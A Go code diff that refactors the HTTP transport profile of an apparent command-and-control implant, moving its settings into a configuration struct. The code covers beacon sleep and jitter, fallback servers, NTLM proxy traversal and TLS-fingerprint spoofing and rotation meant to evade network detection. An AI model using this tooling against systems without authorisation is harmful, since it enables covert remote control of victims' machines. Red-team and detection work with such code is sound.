@@ -115,39 +115,60 @@ type HTTPProfile struct {
 	HandleInteractive      func(msgs []structs.InteractiveMsg)
 }
 
-// NewHTTPProfile creates a new HTTP profile.
-// proxyUser, proxyPass, and proxyDomain are optional proxy authentication credentials.
-// If proxyDomain is set, NTLM authentication is used for the proxy (handles CONNECT + NTLM handshake).
-// If proxyDomain is empty and proxyUser is set, Basic auth is used (credentials embedded in proxy URL).
-// If proxyURL is empty, the system proxy is used (HTTP_PROXY/HTTPS_PROXY env vars).
-func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, proxyUser, proxyPass, proxyDomain, tlsVerify, tlsFingerprint, mtlsCertPEM, mtlsKeyPEM string, fallbackURLs, contentTypes []string, recoverySeconds int) *HTTPProfile {
+// ProfileConfig holds the configuration for creating an HTTP C2 profile.
+type ProfileConfig struct {
+	BaseURL        string
+	UserAgent      string
+	EncryptionKey  string
+	MaxRetries     int
+	SleepInterval  int
+	Jitter         int
+	Debug          bool
+	GetEndpoint    string
+	PostEndpoint   string
+	HostHeader     string
+	ProxyURL       string
+	ProxyUser      string
+	ProxyPass      string
+	ProxyDomain    string
+	TLSVerify      string
+	TLSFingerprint string
+	MTLSCertPEM    string
+	MTLSKeyPEM     string
+	FallbackURLs   []string
+	ContentTypes   []string
+	RecoverySeconds int
+}
+
+// NewHTTPProfile creates a new HTTP profile from the given configuration.
+// Proxy behavior: if ProxyDomain is set, NTLM auth is used for the proxy.
+// If ProxyDomain is empty and ProxyUser is set, Basic auth is used.
+// If ProxyURL is empty, the system proxy is used (HTTP_PROXY/HTTPS_PROXY).
+func NewHTTPProfile(cfg ProfileConfig) *HTTPProfile {
 	profile := &HTTPProfile{
-		BaseURL:       baseURL,
-		UserAgent:     userAgent,
-		EncryptionKey: encryptionKey,
-		MaxRetries:    maxRetries,
-		SleepInterval: sleepInterval,
-		Jitter:        jitter,
-		Debug:         debug,
-		GetEndpoint:   getEndpoint,
-		PostEndpoint:  postEndpoint,
-		HostHeader:    hostHeader,
-		FallbackURLs:  fallbackURLs,
-		ContentTypes:  contentTypes,
-		tracker:       resilience.NewTracker(1+len(fallbackURLs), 3, recoverySeconds),
+		BaseURL:       cfg.BaseURL,
+		UserAgent:     cfg.UserAgent,
+		EncryptionKey: cfg.EncryptionKey,
+		MaxRetries:    cfg.MaxRetries,
+		SleepInterval: cfg.SleepInterval,
+		Jitter:        cfg.Jitter,
+		Debug:         cfg.Debug,
+		GetEndpoint:   cfg.GetEndpoint,
+		PostEndpoint:  cfg.PostEndpoint,
+		HostHeader:    cfg.HostHeader,
+		FallbackURLs:  cfg.FallbackURLs,
+		ContentTypes:  cfg.ContentTypes,
+		tracker:       resilience.NewTracker(1+len(cfg.FallbackURLs), 3, cfg.RecoverySeconds),
 	}
 
-	// Configure TLS based on verification mode
-	tlsConfig := buildTLSConfig(tlsVerify)
+	tlsConfig := buildTLSConfig(cfg.TLSVerify)
 
-	// Configure mTLS client certificate if provided
-	if mtlsCertPEM != "" && mtlsKeyPEM != "" {
-		if cert, err := tls.X509KeyPair([]byte(mtlsCertPEM), []byte(mtlsKeyPEM)); err == nil {
+	if cfg.MTLSCertPEM != "" && cfg.MTLSKeyPEM != "" {
+		if cert, err := tls.X509KeyPair([]byte(cfg.MTLSCertPEM), []byte(cfg.MTLSKeyPEM)); err == nil {
 			tlsConfig.Certificates = []tls.Certificate{cert}
 		}
 	}
 
-	// Configure transport with optional proxy
 	transport := &http.Transport{
 		TLSClientConfig:     tlsConfig,
 		MaxIdleConns:        10,
@@ -155,29 +176,24 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 		IdleConnTimeout:     90 * time.Second,
 	}
 
-	// Configure proxy and TLS fingerprinting
-	useNTLMProxy := proxyURL != "" && proxyUser != "" && proxyDomain != ""
+	useNTLMProxy := cfg.ProxyURL != "" && cfg.ProxyUser != "" && cfg.ProxyDomain != ""
 
 	if useNTLMProxy {
-		// NTLM proxy: handle CONNECT + NTLM handshake + TLS ourselves.
-		// DialTLSContext covers HTTPS targets (CONNECT tunnel + TLS/uTLS).
-		// Proxy is set to nil since we handle the proxy connection directly.
-		proxyU, _ := url.Parse(proxyURL)
+		proxyU, _ := url.Parse(cfg.ProxyURL)
 		proxyAddr := proxyU.Host
 		if _, _, err := net.SplitHostPort(proxyAddr); err != nil {
 			proxyAddr = net.JoinHostPort(proxyAddr, "8080")
 		}
-		transport.DialTLSContext = ntlmProxyTLSDialer(proxyAddr, proxyDomain, proxyUser, proxyPass, tlsConfig, tlsFingerprint)
+		transport.DialTLSContext = ntlmProxyTLSDialer(proxyAddr, cfg.ProxyDomain, cfg.ProxyUser, cfg.ProxyPass, tlsConfig, cfg.TLSFingerprint)
 		transport.TLSClientConfig = nil
 		transport.Proxy = nil
-	} else if proxyURL != "" {
-		// Standard proxy: Basic auth via URL credentials
-		if proxyU, err := url.Parse(proxyURL); err == nil {
-			if proxyUser != "" && proxyU.User == nil {
-				if proxyPass != "" {
-					proxyU.User = url.UserPassword(proxyUser, proxyPass)
+	} else if cfg.ProxyURL != "" {
+		if proxyU, err := url.Parse(cfg.ProxyURL); err == nil {
+			if cfg.ProxyUser != "" && proxyU.User == nil {
+				if cfg.ProxyPass != "" {
+					proxyU.User = url.UserPassword(cfg.ProxyUser, cfg.ProxyPass)
 				} else {
-					proxyU.User = url.User(proxyUser)
+					proxyU.User = url.User(cfg.ProxyUser)
 				}
 			}
 			transport.Proxy = http.ProxyURL(proxyU)
@@ -186,13 +202,11 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 		transport.Proxy = systemProxyFunc()
 	}
 
-	// uTLS fingerprinting for non-NTLM-proxy connections.
-	// When using NTLM proxy, DialTLSContext already handles fingerprinting.
 	if !useNTLMProxy {
-		if isRotateFingerprint(tlsFingerprint) {
+		if isRotateFingerprint(cfg.TLSFingerprint) {
 			transport.DialTLSContext = buildRotatingDialer(tlsConfig)
 			transport.TLSClientConfig = nil
-		} else if helloID, ok := tlsFingerprintID(tlsFingerprint); ok {
+		} else if helloID, ok := tlsFingerprintID(cfg.TLSFingerprint); ok {
 			transport.DialTLSContext = buildUTLSTransportDialer(helloID, tlsConfig)
 			transport.TLSClientConfig = nil
 		}
